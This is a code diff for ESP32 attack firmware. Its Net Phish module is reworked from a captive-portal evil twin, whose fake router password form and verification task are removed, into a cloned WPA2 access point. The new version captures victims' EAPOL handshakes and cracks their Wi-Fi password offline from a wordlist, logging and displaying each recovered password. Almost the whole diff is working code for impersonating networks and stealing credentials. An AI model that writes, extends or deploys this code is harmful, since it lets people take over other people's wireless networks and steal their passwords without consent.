@@ -43,7 +43,8 @@
 #include <BLEScan.h>
 #include <BLEAdvertisedDevice.h>
 #include <BLEAdvertising.h>
-#include <DNSServer.h>     // wildcard DNS for Net Phish captive portal
+#include <mbedtls/md.h>    // HMAC-SHA1 for WPA handshake crack
+#include <mbedtls/pkcs5.h> // PBKDF2-SHA1 for PMK derivation
 
 // ─────────────────────────────────────────────────────────────
 //  Config
@@ -407,9 +408,28 @@ struct {
     uint32_t startMs    = 0;
     uint32_t verifyStartMs = 0;
 } g_phish;
-DNSServer    g_phishDns;
-TaskHandle_t g_phishDnsTask  = nullptr;
 TaskHandle_t g_phishVerifyTask = nullptr;
+
+// ── Net Phish v2: WPA handshake capture state ───────────────
+// Filled by the EAPOL promiscuous callback during a client's
+// connection attempt to the clone AP. Once we have M1 (ANonce)
+// and M2 (SNonce + MIC + EAPOL body), the cracker iterates the
+// wordlist to recover the victim's PSK.
+struct {
+    bool     m1Captured = false;
+    bool     m2Captured = false;
+    bool     cracked    = false;
+    uint8_t  apMac[6]   = {};
+    uint8_t  staMac[6]  = {};
+    uint8_t  aNonce[32] = {};
+    uint8_t  sNonce[32] = {};
+    uint8_t  mic[16]    = {};
+    uint8_t  eapolBody[256] = {};  // EAPOL frame from M2 with MIC zeroed
+    uint16_t eapolBodyLen = 0;
+    uint32_t tried        = 0;
+    uint32_t total        = 0;
+} g_hsk;
+TaskHandle_t g_phishCrackTask = nullptr;
 
 // ── WiFi Brute-Force ─────────────────────────────────────
 struct {
@@ -1794,166 +1814,264 @@ void stopAirtagScan() {
 }
 
 // ─────────────────────────────────────────────────────────────
-//  ████  NET PHISH (Captive Portal Evil Twin)  ████
+//  ████  WPA HANDSHAKE CRACK PRIMITIVES (mbedTLS)  ████
 // ─────────────────────────────────────────────────────────────
-// Authorized-research / lab-only network-impersonation tool.
+// Standard IEEE 802.11i math for offline 4-way handshake cracking.
+// All three functions are pure compute — no I/O, no globals — so they
+// can be reused by any module that needs to verify a PSK guess against
+// a captured handshake (Net Phish v2 today, optional PMKID cracker
+// later).
 //
-// Flow:
-//   START: tear down ESP32-SecurityLab AP, bring up a NEW open AP
-//          using the target's SSID verbatim. Wildcard DNS sends every
-//          query → 192.168.4.1. HTTP routes that are normally landing
-//          page now serve a router-style password form.
-//   FORM:  victim's submitted password lands in g_phish.submittedPwd.
-//   VERIFY: ESP tears down clone AP, switches to STA, tries to
-//          associate with the real BSSID on its real channel using
-//          the submitted password. WL_CONNECTED within ~10 s = success.
-//   RESULT: on success, ssid + password shown on OLED and recorded.
-//          on failure, clone AP comes back up and the form is re-shown.
+// References:
+//   - IEEE 802.11-2016 §12.7.1 (PTK derivation)
+//   - RFC 2898 (PBKDF2)
+//   - hashcat -m 22000 implementation as ground truth
 
-// Captive-portal landing page — looks like a generic router auth screen.
-// Inline so it works even before LittleFS contents are uploaded.
-static const char PHISH_HTML[] PROGMEM = R"HTML(<!doctype html><html><head>
-<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Wi-Fi Authentication</title>
-<style>
-*{box-sizing:border-box;margin:0;padding:0}
-body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,sans-serif;
-background:#f4f5f7;color:#222;min-height:100vh;display:flex;align-items:center;
-justify-content:center;padding:20px}
-.card{background:#fff;border-radius:12px;box-shadow:0 4px 24px rgba(0,0,0,.08);
-max-width:420px;width:100%;padding:32px 28px}
-.logo{width:48px;height:48px;background:#0066cc;border-radius:10px;
-display:flex;align-items:center;justify-content:center;color:#fff;
-font-size:22px;margin-bottom:16px}
-h1{font-size:22px;margin-bottom:6px;color:#111}
-.sub{color:#666;font-size:14px;margin-bottom:24px}
-.ssid{display:inline-block;background:#eef3ff;border:1px solid #cfdbf7;
-border-radius:6px;padding:3px 10px;font-weight:600;color:#0066cc;margin-bottom:18px}
-label{display:block;font-size:13px;color:#444;margin-bottom:6px;font-weight:500}
-input[type=password],input[type=text]{width:100%;padding:12px 14px;
-border:1px solid #d4d7dc;border-radius:8px;font-size:15px;outline:none;
-transition:border .15s}
-input:focus{border-color:#0066cc}
-button{width:100%;margin-top:18px;background:#0066cc;color:#fff;border:none;
-padding:13px;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;
-transition:background .15s}
-button:hover{background:#0052a3}
-.err{background:#fff3f3;border:1px solid #ffd6d6;color:#a51919;
-border-radius:6px;padding:10px 12px;margin-bottom:14px;font-size:13px}
-.foot{margin-top:18px;text-align:center;color:#888;font-size:12px}
-</style></head><body>
-<div class="card">
-<div class="logo">&#x2261;</div>
-<h1>Wi-Fi Re-authentication</h1>
-<p class="sub">Your connection to this network has expired. Please re-enter the Wi-Fi password to continue.</p>
-<span class="ssid">__SSID__</span>
-__ERR__
-<form method="POST" action="/auth" autocomplete="off">
-<label for="p">Wi-Fi password</label>
-<input id="p" name="p" type="password" placeholder="Network password" required minlength="8" maxlength="63" autofocus>
-<button type="submit">Connect</button>
-</form>
-<div class="foot">Secure connection required &middot; Router admin</div>
-</div></body></html>)HTML";
-
-static String phishRenderPage(bool showError) {
-    String out = FPSTR(PHISH_HTML);
-    // Sanitize SSID — replace < > & " ' with HTML entities to prevent
-    // XSS if a target SSID contains markup (some routers allow that)
-    String s = g_phish.ssid;
-    s.replace("&", "&amp;"); s.replace("<", "&lt;");  s.replace(">", "&gt;");
-    s.replace("\"","&quot;"); s.replace("'", "&#39;");
-    out.replace("__SSID__", s);
-    out.replace("__ERR__",
-        showError ? "<div class=\"err\">Incorrect password. Please try again.</div>"
-                  : "");
-    return out;
+// PMK = PBKDF2-HMAC-SHA1(passphrase, ssid, 4096, 256)
+// Cost: ~50-80 ms per call on ESP32 @ 240 MHz (the dominant
+// loop cost — this is why a 5000-entry wordlist takes ~5-7 min).
+static void wpaDerivePMK(const char* pass, int passLen,
+                         const uint8_t* ssid, int ssidLen,
+                         uint8_t* pmk_out) {
+    mbedtls_md_context_t ctx;
+    mbedtls_md_init(&ctx);
+    mbedtls_md_setup(&ctx,
+        mbedtls_md_info_from_type(MBEDTLS_MD_SHA1), 1);
+    mbedtls_pkcs5_pbkdf2_hmac(&ctx,
+        (const unsigned char*)pass, passLen,
+        ssid, ssidLen,
+        4096, 32, pmk_out);
+    mbedtls_md_free(&ctx);
 }
 
-// DNS catch-all task — every query returns AP_IP, so any URL the
-// victim's browser tries (e.g. captive.apple.com, connectivitycheck.android.com)
-// resolves to the phish page.
-void phishDnsTaskFn(void*) {
-    while (g_phish.active) {
-        g_phishDns.processNextRequest();
-        vTaskDelay(pdMS_TO_TICKS(5));
+// PRF-N as defined by 802.11i §11.6.1.2 — used to expand PMK + nonces
+// + macs into the PTK. We only call it with N=64 (PTK length for
+// CCMP/AES). Output is the concatenation of HMAC-SHA1 blocks with an
+// incrementing counter byte appended to the seed.
+static void wpaPrf(const uint8_t* key, int keyLen,
+                   const char* label, int labelLen,
+                   const uint8_t* data, int dataLen,
+                   uint8_t* out, int outLen) {
+    mbedtls_md_context_t ctx;
+    mbedtls_md_init(&ctx);
+    mbedtls_md_setup(&ctx,
+        mbedtls_md_info_from_type(MBEDTLS_MD_SHA1), 1);
+
+    uint8_t buf[128];
+    int     bufLen = labelLen + 1 + dataLen + 1;
+    memcpy(buf, label, labelLen);
+    buf[labelLen] = 0x00;
+    memcpy(buf + labelLen + 1, data, dataLen);
+
+    uint8_t sha[20];
+    int     pos = 0;
+    uint8_t counter = 0;
+    while (pos < outLen) {
+        buf[bufLen - 1] = counter++;
+        mbedtls_md_hmac_starts(&ctx, key, keyLen);
+        mbedtls_md_hmac_update(&ctx, buf, bufLen);
+        mbedtls_md_hmac_finish(&ctx, sha);
+        int copy = (outLen - pos > 20) ? 20 : (outLen - pos);
+        memcpy(out + pos, sha, copy);
+        pos += copy;
     }
-    g_phishDns.stop();
-    g_phishDnsTask = nullptr;
-    vTaskDelete(nullptr);
+    mbedtls_md_free(&ctx);
 }
 
-// Verification task — runs in phase 2. Swap to STA-only, try the
-// submitted password against the real network, report result, then
-// (on failure) bring the clone AP back up for another attempt.
-void phishVerifyTaskFn(void*) {
-    logAdd(String("Phish: verifying '") + g_phish.submittedPwd + "' on " + g_phish.ssid, "WARN");
-    g_phish.verifyStartMs = millis();
-
-    // Bring AP down so STA can fully own the radio (avoids the
-    // 'invalid interface' issue we hit before). Save current config
-    // so we can rebuild it after.
-    String savedAp = g_apSSID;
-    String savedPw = g_apPass;
-    uint8_t savedCh = AP_CHANNEL;
-
-    // Tear down phishing AP for the verification window
-    esp_wifi_set_mode(WIFI_MODE_STA);
-    vTaskDelay(pdMS_TO_TICKS(150));
-
-    WiFi.disconnect(false, false);
-    vTaskDelay(pdMS_TO_TICKS(120));
-    WiFi.begin((const char*)g_phish.ssid, (const char*)g_phish.submittedPwd);
-
-    bool connected = false;
-    unsigned long start = millis();
-    while (millis() - start < 10000) {  // 10 s window
-        wl_status_t st = WiFi.status();
-        if (st == WL_CONNECTED) { connected = true; break; }
-        if (st == WL_CONNECT_FAILED || st == WL_NO_SSID_AVAIL) break;
-        vTaskDelay(pdMS_TO_TICKS(150));
-    }
-
-    WiFi.disconnect(false, false);
-    vTaskDelay(pdMS_TO_TICKS(150));
-
-    if (connected) {
-        strncpy(g_phish.verifiedPwd, g_phish.submittedPwd, 63);
-        g_phish.verifiedPwd[63] = '\0';
-        g_phish.phase = 3;  // SUCCESS
-        logAdd(String("Phish SUCCESS: ") + g_phish.ssid + " = " + g_phish.verifiedPwd, "WARN");
-
-        // Persist
-        if (!LittleFS.exists("/captures")) LittleFS.mkdir("/captures");
-        File f = LittleFS.open("/captures/phish.log", "a");
-        if (f) {
-            f.printf("[%lu] SSID=%s PASS=%s ATTEMPTS=%d\n",
-                     (unsigned long)(millis()/1000),
-                     g_phish.ssid, g_phish.verifiedPwd, g_phish.attempts);
-            f.close();
-        }
-
-        // Keep AP off — we're done. User long-presses to stop.
+// PTK = PRF-512(PMK, "Pairwise key expansion",
+//                min(AA,SPA)||max(AA,SPA)||min(ANonce,SNonce)||max(ANonce,SNonce))
+// We only need the first 16 bytes (the KCK — Key Confirmation Key)
+// for MIC verification, so we compute 64 bytes and use ptk[0..15].
+static void wpaDerivePTK(const uint8_t* pmk,
+                         const uint8_t* apMac, const uint8_t* staMac,
+                         const uint8_t* aNonce, const uint8_t* sNonce,
+                         uint8_t* ptk_out) {
+    uint8_t data[76];
+    if (memcmp(apMac, staMac, 6) < 0) {
+        memcpy(data + 0, apMac,  6); memcpy(data + 6,  staMac, 6);
     } else {
-        g_phish.phase = 4;  // FAILED
-        logAdd(String("Phish: password '") + g_phish.submittedPwd + "' failed", "WARN");
+        memcpy(data + 0, staMac, 6); memcpy(data + 6,  apMac,  6);
+    }
+    if (memcmp(aNonce, sNonce, 32) < 0) {
+        memcpy(data + 12, aNonce, 32); memcpy(data + 44, sNonce, 32);
+    } else {
+        memcpy(data + 12, sNonce, 32); memcpy(data + 44, aNonce, 32);
+    }
+    wpaPrf(pmk, 32, "Pairwise key expansion", 22, data, 76, ptk_out, 64);
+}
 
-        // Re-arm the clone AP for another attempt
-        esp_wifi_set_mode(WIFI_MODE_APSTA);
-        vTaskDelay(pdMS_TO_TICKS(150));
-        WiFi.softAPConfig(AP_IP, AP_GW, AP_SN);
-        WiFi.softAP(g_phish.ssid, nullptr, g_phish.channel, 0, 8);
-        vTaskDelay(pdMS_TO_TICKS(200));
-        g_phish.phase = 1;  // back to waiting for input
+// MIC = HMAC-SHA1(KCK, EAPOL-frame-with-MIC-field-zeroed)[:16]
+// Returns true iff the recomputed MIC matches the captured MIC.
+static bool wpaCheckMIC(const uint8_t* kck,
+                        const uint8_t* eapolBody, int eapolBodyLen,
+                        const uint8_t* expectedMic) {
+    uint8_t mic[20];
+    mbedtls_md_context_t ctx;
+    mbedtls_md_init(&ctx);
+    mbedtls_md_setup(&ctx,
+        mbedtls_md_info_from_type(MBEDTLS_MD_SHA1), 1);
+    mbedtls_md_hmac_starts(&ctx, kck, 16);
+    mbedtls_md_hmac_update(&ctx, eapolBody, eapolBodyLen);
+    mbedtls_md_hmac_finish(&ctx, mic);
+    mbedtls_md_free(&ctx);
+    return memcmp(mic, expectedMic, 16) == 0;
+}
+
+// Full per-password test against the captured handshake.
+static bool wpaTryPassword(const char* password,
+                           const uint8_t* ssid, int ssidLen) {
+    uint8_t pmk[32], ptk[64];
+    wpaDerivePMK(password, strlen(password), ssid, ssidLen, pmk);
+    wpaDerivePTK(pmk, g_hsk.apMac, g_hsk.staMac,
+                       g_hsk.aNonce, g_hsk.sNonce, ptk);
+    return wpaCheckMIC(ptk, g_hsk.eapolBody, g_hsk.eapolBodyLen, g_hsk.mic);
+}
+
+// EAPOL promiscuous callback — fills g_hsk during connection attempts
+// against the Net Phish clone AP. Captures M1 (ANonce from AP) and
+// M2 (SNonce + MIC + body from client).
+static void phishEapolCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
+    if (!g_phish.active || g_phish.phase >= 3) return;
+    if (type != WIFI_PKT_DATA) return;
+    auto*    pkt = (wifi_promiscuous_pkt_t*)buf;
+    uint16_t len = pkt->rx_ctrl.sig_len;
+    uint8_t* pay = pkt->payload;
+    if (len < 100) return;
+
+    // Locate EAPOL EtherType (0x88 0x8E) — typically right after the
+    // LLC/SNAP header at offset 32, but we scan a small window to
+    // handle WMM (QoS) frames where the header is 26 bytes instead of 24.
+    int eapolOff = -1;
+    for (int i = 24; i + 1 < (int)len && i < 80; i++)
+        if (pay[i] == 0x88 && pay[i + 1] == 0x8E) { eapolOff = i + 2; break; }
+    if (eapolOff < 0) return;
+    if (eapolOff + 99 > (int)len) return;
+    if (pay[eapolOff + 1] != 0x03) return;          // EAPOL-Key
+    int keyOff = eapolOff + 4;
+    uint8_t descType = pay[keyOff];
+    if (descType != 0x02 && descType != 0xFE) return; // RSN or WPA
+
+    uint16_t ki = ((uint16_t)pay[keyOff + 1] << 8) | pay[keyOff + 2];
+    bool keyAck  = ki & 0x0080;
+    bool keyMic  = ki & 0x0100;
+    bool secure  = ki & 0x0200;
+    bool install = ki & 0x0040;
+
+    auto* hdr = (Ieee80211Hdr*)pay;
+
+    // M1 — AP → STA, ack=1, MIC=0 → carries ANonce
+    if (keyAck && !keyMic && !g_hsk.m1Captured) {
+        memcpy(g_hsk.apMac,  hdr->src, 6);
+        memcpy(g_hsk.staMac, hdr->dst, 6);
+        memcpy(g_hsk.aNonce, &pay[keyOff + 13], 32);
+        g_hsk.m1Captured = true;
+        return;
+    }
+    // M2 — STA → AP, ack=0, MIC=1, secure=0, install=0 → carries SNonce + MIC
+    if (keyMic && !keyAck && !secure && !install &&
+        g_hsk.m1Captured && !g_hsk.m2Captured) {
+        // Confirm same conversation by MAC pair
+        if (memcmp(hdr->dst, g_hsk.apMac, 6) != 0) return;
+        if (memcmp(hdr->src, g_hsk.staMac, 6) != 0) return;
+
+        memcpy(g_hsk.sNonce, &pay[keyOff + 13], 32);
+        memcpy(g_hsk.mic,    &pay[keyOff + 77], 16);
+
+        // Copy the full EAPOL frame (header + body) and zero the MIC
+        // field so it matches what was MIC'd by the client.
+        int eapolLen = ((int)pay[eapolOff + 2] << 8) | pay[eapolOff + 3];
+        eapolLen += 4;                          // include EAPOL header
+        if (eapolLen > 256) eapolLen = 256;
+        if (eapolOff + eapolLen > (int)len) eapolLen = (int)len - eapolOff;
+        memcpy(g_hsk.eapolBody, &pay[eapolOff], eapolLen);
+        memset(&g_hsk.eapolBody[4 + 77], 0, 16); // zero the MIC field
+        g_hsk.eapolBodyLen = eapolLen;
+        g_hsk.m2Captured   = true;
+        g_phish.phase      = 2;                  // CAPT — ready to crack
+    }
+}
+
+// Crack task — iterates /wordlist.txt against the captured handshake.
+// Runs on Core 0 (CPU-bound, doesn't compete with AsyncTCP).
+void phishCrackTaskFn(void*) {
+    File f = LittleFS.open("/wordlist.txt", "r");
+    if (!f) {
+        logAdd("Phish crack: /wordlist.txt missing", "WARN");
+        g_phish.phase = 4;          // WRONG / no match
+        g_phishCrackTask = nullptr;
+        vTaskDelete(nullptr);
+        return;
     }
 
-    g_phishVerifyTask = nullptr;
+    g_phish.phase = 3;              // CRACK
+    g_hsk.tried   = 0;
+    uint8_t ssidBytes[33];
+    int     ssidLen = strlen(g_phish.ssid);
+    memcpy(ssidBytes, g_phish.ssid, ssidLen);
+
+    while (g_phish.active && f.available()) {
+        String line = f.readStringUntil('\n');
+        line.trim();
+        if (line.length() < 8 || line.length() > 63 || line[0] == '#') continue;
+
+        g_hsk.tried++;
+        if (wpaTryPassword(line.c_str(), ssidBytes, ssidLen)) {
+            strncpy(g_phish.verifiedPwd, line.c_str(), 63);
+            g_phish.verifiedPwd[63] = '\0';
+            g_hsk.cracked = true;
+            g_phish.phase = 5;       // PWNED via crack
+            logAdd(String("Phish CRACKED: ")+g_phish.ssid+" = "+line, "WARN");
+            break;
+        }
+        if (g_hsk.tried % 10 == 0)
+            logAdd("Crack: "+String(g_hsk.tried)+" tries");
+        vTaskDelay(pdMS_TO_TICKS(1));  // yield to TWDT
+    }
+    f.close();
+
+    if (g_hsk.cracked) {
+        if (!LittleFS.exists("/captures")) LittleFS.mkdir("/captures");
+        File log = LittleFS.open("/captures/phish.log", "a");
+        if (log) {
+            log.printf("[%lu] SSID=%s PASS=%s TRIES=%lu\n",
+                       (unsigned long)(millis()/1000),
+                       g_phish.ssid, g_phish.verifiedPwd,
+                       (unsigned long)g_hsk.tried);
+            log.close();
+        }
+    } else if (g_phish.active) {
+        g_phish.phase = 4;           // WRONG — not in wordlist
+        logAdd("Phish crack: password not in wordlist", "WARN");
+    }
+
+    g_phishCrackTask = nullptr;
     vTaskDelete(nullptr);
 }
+
+// ─────────────────────────────────────────────────────────────
+//  ████  NET PHISH v2 (WPA Handshake Capture + Offline Crack)  ████
+// ─────────────────────────────────────────────────────────────
+// Behaviour: identical-look-and-feel to the real target network.
+//   1. ESP brings up a clone AP with the target's SSID + a DUMMY
+//      WPA-PSK password ("REAPER_TRAP_X" where X is random). To the
+//      victim it looks indistinguishable from the real network — they
+//      see it in the OS Wi-Fi list with a lock icon, click it, type
+//      their real password.
+//   2. The handshake FAILS at the client (MICs don't match because
+//      our dummy PSK differs from the real one). But during the
+//      attempt the client transmits M2 with a MIC derived from THEIR
+//      password — that's enough material to crack offline.
+//   3. The promiscuous callback (phishEapolCallback above) captures
+//      M1 (ANonce) and M2 (SNonce + MIC + EAPOL body).
+//   4. phishCrackTaskFn iterates /wordlist.txt, computing
+//      PMK → PTK → MIC for each candidate, comparing against the
+//      captured MIC. First match wins.
+//   5. On success: OLED shows "PWNED: <password>" and the result is
+//      appended to /captures/phish.log.
 
 bool startNetPhish(const char* ssid, const uint8_t bssid[6], uint8_t channel) {
     stopNetPhish();
-    // Stop conflicting modules — phish needs the radio + the web server
+    // Stop conflicting radio users — phish needs exclusive control
     if (g_deauth.active)   stopDeauth();
     if (g_beacon.active)   stopBeaconFlood();
     if (g_brute.active)    stopBruteForce();
@@ -1970,26 +2088,39 @@ bool startNetPhish(const char* ssid, const uint8_t bssid[6], uint8_t channel) {
     g_phish.verifiedPwd[0] = '\0';
     g_phish.attempts       = 0;
     g_phish.clients        = 0;
-    g_phish.phase          = 1;
+    g_phish.phase          = 1;        // BAIT — waiting for client
     g_phish.startMs        = millis();
     g_phish.active         = true;
 
-    // Bring up the clone AP — open (no password), target SSID, target channel
+    // Reset handshake capture state
+    g_hsk.m1Captured = false;
+    g_hsk.m2Captured = false;
+    g_hsk.cracked    = false;
+    g_hsk.tried      = 0;
+
+    // Dummy WPA-PSK password — random per-run so cached client profiles
+    // don't accidentally succeed. We never use this value to verify
+    // anything; it just makes ESP32 advertise a WPA2-protected AP.
+    char dummyPw[16];
+    snprintf(dummyPw, sizeof(dummyPw), "REAP_%lu", (unsigned long)(esp_random() & 0xFFFFFFFF));
+
+    // Bring up clone AP — exact SSID, target channel, WPA2-PSK
     WiFi.disconnect(false, false);
     esp_wifi_set_mode(WIFI_MODE_APSTA);
     vTaskDelay(pdMS_TO_TICKS(150));
     WiFi.softAPConfig(AP_IP, AP_GW, AP_SN);
-    WiFi.softAP(g_phish.ssid, nullptr, g_phish.channel, 0, 8);
+    WiFi.softAP(g_phish.ssid, dummyPw, g_phish.channel, 0, 8);
     vTaskDelay(pdMS_TO_TICKS(200));
 
-    // Wildcard DNS — every domain resolves to AP_IP
-    g_phishDns.setErrorReplyCode(DNSReplyCode::NoError);
-    g_phishDns.start(53, "*", AP_IP);
-    xTaskCreatePinnedToCore(phishDnsTaskFn, "phish_dns", 4096,
-                            nullptr, 3, &g_phishDnsTask, 1);
+    // Enable promiscuous capture for EAPOL frames during connection
+    // attempts. Filter to DATA frames only (EAPOL rides on data).
+    esp_wifi_set_promiscuous_rx_cb(phishEapolCallback);
+    esp_wifi_set_promiscuous(true);
+    wifi_promiscuous_filter_t filt = { .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA };
+    esp_wifi_set_promiscuous_filter(&filt);
 
-    logAdd(String("Phish started: clone='") + g_phish.ssid +
-           "' ch=" + String(g_phish.channel), "WARN");
+    logAdd(String("Phish v2 started: clone='") + g_phish.ssid +
+           "' ch=" + String(g_phish.channel) + " (WPA-PSK trap)", "WARN");
     return true;
 }
 
@@ -1997,14 +2128,17 @@ void stopNetPhish() {
     if (!g_phish.active) return;
     g_phish.active = false;
 
-    // DNS task observes the flag and exits
-    for (int i = 0; i < 10 && g_phishDnsTask; i++) vTaskDelay(pdMS_TO_TICKS(50));
-    if (g_phishDnsTask) { vTaskDelete(g_phishDnsTask); g_phishDnsTask = nullptr; }
-    g_phishDns.stop();
+    // Halt the crack task if it's still iterating
+    for (int i = 0; i < 30 && g_phishCrackTask; i++)
+        vTaskDelay(pdMS_TO_TICKS(100));
+    if (g_phishCrackTask) {
+        vTaskDelete(g_phishCrackTask);
+        g_phishCrackTask = nullptr;
+    }
 
-    // Verify task — let it finish (max ~12 s)
-    for (int i = 0; i < 130 && g_phishVerifyTask; i++) vTaskDelay(pdMS_TO_TICKS(100));
-    if (g_phishVerifyTask) { vTaskDelete(g_phishVerifyTask); g_phishVerifyTask = nullptr; }
+    // Tear down promiscuous capture
+    esp_wifi_set_promiscuous(false);
+    esp_wifi_set_promiscuous_rx_cb(nullptr);
 
     // Restore the original REAPER AP
     esp_wifi_set_mode(WIFI_MODE_APSTA);
@@ -2015,6 +2149,21 @@ void stopNetPhish() {
 
     g_phish.phase = 0;
     logAdd("Phish stopped");
+}
+
+// loop() polling helper — once M2 is captured, kick off the cracker
+// (we can't spawn a task from a promiscuous-mode RX callback because
+// it runs in ISR-ish context). main loop calls this periodically.
+static void phishPoll() {
+    if (!g_phish.active) return;
+    if (g_phish.phase == 2 && !g_phishCrackTask) {
+        // M1 + M2 captured — start offline crack
+        // Disable promiscuous so the cracker has full CPU
+        esp_wifi_set_promiscuous(false);
+        esp_wifi_set_promiscuous_rx_cb(nullptr);
+        xTaskCreatePinnedToCore(phishCrackTaskFn, "phish_crk",
+                                12288, nullptr, 4, &g_phishCrackTask, 0);
+    }
 }
 
 // ─────────────────────────────────────────────────────────────
@@ -2396,13 +2545,17 @@ static void drawCombo() {
     oled.display();
 }
 
-// ── Net Phish (captive-portal evil-twin) ─────────────────────
+// ── Net Phish v2 — WPA handshake capture + offline crack ─────
+// Phases:  1 BAIT (AP up, waiting)   2 CAPT (M1+M2 captured)
+//          3 CRACK (iterating wordlist) 4 MISS (no match)
+//          5 PWNED (password recovered)
 static void drawPhish() {
     oled.clearDisplay();
     const char* status =
-        g_phish.phase == 3 ? "PWNED" :
-        g_phish.phase == 2 ? "CHECK" :
-        g_phish.phase == 4 ? "WRONG" :
+        g_phish.phase == 5 ? "PWNED" :
+        g_phish.phase == 3 ? "CRACK" :
+        g_phish.phase == 2 ? "CAPT"  :
+        g_phish.phase == 4 ? "MISS"  :
         g_phish.phase == 1 ? "BAIT"  : "STOP";
     oledHeader("Net Phish", status);
     oled.setTextColor(WHITE); oled.setTextSize(1);
@@ -2411,34 +2564,40 @@ static void drawPhish() {
     snprintf(buf, sizeof(buf), "AP: %.16s", g_phish.ssid[0] ? g_phish.ssid : "(none)");
     oled.setCursor(0, 14); oled.print(buf);
 
-    if (g_phish.phase == 3) {
-        // SUCCESS — show captured password (truncated to 18 chars)
+    if (g_phish.phase == 5) {
+        // PWNED — show recovered password
         oled.setCursor(0, 26); oled.print("PASSWORD:");
         char shown[19]; strncpy(shown, g_phish.verifiedPwd, 18); shown[18] = '\0';
         oled.setCursor(0, 38); oled.print(shown);
-        snprintf(buf, sizeof(buf), "(attempts: %d)", g_phish.attempts);
+        snprintf(buf, sizeof(buf), "(tries: %lu)", (unsigned long)g_hsk.tried);
         oled.setCursor(0, 50); oled.print(buf);
         oledHint(">back   hold=stop");
-    } else if (g_phish.phase == 2) {
-        uint32_t secs = (millis() - g_phish.verifyStartMs) / 1000;
-        snprintf(buf, sizeof(buf), "Verifying... %lus", (unsigned long)secs);
-        oled.setCursor(0, 26); oled.print(buf);
-        char shown[19]; strncpy(shown, g_phish.submittedPwd, 18); shown[18] = '\0';
-        oled.setCursor(0, 38); oled.print(shown);
+    } else if (g_phish.phase == 3) {
+        // CRACKING — show progress
+        oled.setCursor(0, 26); oled.print("Cracking handshake");
+        snprintf(buf, sizeof(buf), "Tried: %lu", (unsigned long)g_hsk.tried);
+        oled.setCursor(0, 38); oled.print(buf);
+        oled.setCursor(0, 50); oled.print("(~50ms/pwd)");
         oledHint(">back   hold=stop");
-    } else if (g_phish.phase == 4 || g_phish.phase == 1) {
-        // BAIT or after a WRONG attempt
+    } else if (g_phish.phase == 2) {
+        // CAPT — handshake collected, crack starting
+        oled.setCursor(0, 26); oled.print("Handshake captured");
+        oled.setCursor(0, 38); oled.print("Starting crack...");
+        oledHint(">back   hold=stop");
+    } else if (g_phish.phase == 4) {
+        // MISS — wordlist exhausted, no password matched
+        snprintf(buf, sizeof(buf), "Tried: %lu", (unsigned long)g_hsk.tried);
+        oled.setCursor(0, 26); oled.print(buf);
+        oled.setCursor(0, 38); oled.print("Not in wordlist");
+        oled.setCursor(0, 50); oled.print("Add words & retry");
+        oledHint(">back   hold=restart");
+    } else if (g_phish.phase == 1) {
+        // BAIT — waiting for victim
         snprintf(buf, sizeof(buf), "Clients: %d", (int)WiFi.softAPgetStationNum());
         oled.setCursor(0, 26); oled.print(buf);
-        if (g_phish.attempts > 0) {
-            snprintf(buf, sizeof(buf), "Wrong: %d", g_phish.attempts);
-            oled.setCursor(0, 38); oled.print(buf);
-            char shown[19]; strncpy(shown, g_phish.submittedPwd, 18); shown[18] = '\0';
-            oled.setCursor(0, 50); oled.print(shown);
-        } else {
-            oled.setCursor(0, 38); oled.print("Open AP cloned");
-            oled.setCursor(0, 50); oled.print("Waiting for input");
-        }
+        oled.setCursor(0, 38); oled.print("WPA-PSK trap up");
+        oled.setCursor(0, 50);
+        oled.print(g_hsk.m1Captured ? "M1 seen, need M2" : "Waiting EAPOL...");
         oledHint(">back   hold=stop");
     } else {
         oled.setCursor(0, 26); oled.print("Pick target with *");
@@ -3065,57 +3224,14 @@ static void serveHtml(AsyncWebServerRequest* req, const char* fsPath) {
 }
 
 void setupRoutes() {
-    // ── Net Phish: POST /auth receives the form submission ────────
-    // Registered first so it always wins over static handlers.
-    server.on("/auth", HTTP_POST, [](AsyncWebServerRequest* req){
-        if (!g_phish.active) { req->send(404, "text/plain", "Not Found"); return; }
-        if (g_phish.phase == 2) {
-            // Already verifying — re-show form so victim doesn't see a 404
-            req->send(200, "text/html", phishRenderPage(false));
-            return;
-        }
-        if (!req->hasParam("p", true)) {
-            req->send(200, "text/html", phishRenderPage(true));
-            return;
-        }
-        const AsyncWebParameter* pp = req->getParam("p", true);
-        const String& pwd = pp->value();
-        if (pwd.length() < 8 || pwd.length() > 63) {
-            req->send(200, "text/html", phishRenderPage(true));
-            return;
-        }
-        strncpy(g_phish.submittedPwd, pwd.c_str(), 63);
-        g_phish.submittedPwd[63] = '\0';
-        g_phish.attempts++;
-        g_phish.phase = 2;  // VERIFYING
-
-        // Spawn the verify task — runs ~10 s
-        if (!g_phishVerifyTask) {
-            xTaskCreatePinnedToCore(phishVerifyTaskFn, "phish_vfy", 8192,
-                                    nullptr, 4, &g_phishVerifyTask, 1);
-        }
-        // Show a brief "Connecting…" page so the victim waits.
-        req->send(200, "text/html",
-            "<!doctype html><html><head><meta charset=utf-8>"
-            "<meta http-equiv=refresh content=\"12;url=/\">"
-            "<title>Connecting...</title></head>"
-            "<body style=\"font-family:sans-serif;text-align:center;padding-top:80px;color:#444\">"
-            "<h2>Connecting...</h2><p>Please wait while the network re-authenticates.</p>"
-            "</body></html>");
-    });
-
-    // ── Catch-all GET: phishing landing OR REAPER landing ─────────
+    // REAPER web surface = landing page only.
+    // Net Phish v2 captures credentials via WPA handshake (no web form),
+    // so no /auth route is exposed.
     server.serveStatic("/style.css", LittleFS, "/style.css")
           .setCacheControl("max-age=604800, public");
     server.serveStatic("/", LittleFS, "/").setDefaultFile("index.html");
 
     server.onNotFound([](AsyncWebServerRequest* req){
-        // While phishing is active, any unmatched URL returns the
-        // captive-portal page (so apple/android probes all see it).
-        if (g_phish.active) {
-            req->send(200, "text/html", phishRenderPage(g_phish.phase == 4));
-            return;
-        }
         req->send(404, "application/json", "{\"error\":\"Not Found\"}");
     });
 }
@@ -3279,6 +3395,10 @@ void setup() {
 void loop() {
     // Poll button
     btnTick();
+
+    // Kick off crack task once handshake is captured (can't spawn from
+    // promiscuous callback — runs in ISR-ish context).
+    phishPoll();
 
     // Refresh OLED immediately on state change, or every 750 ms for live counters
     static unsigned long lastOledRefresh = 0;
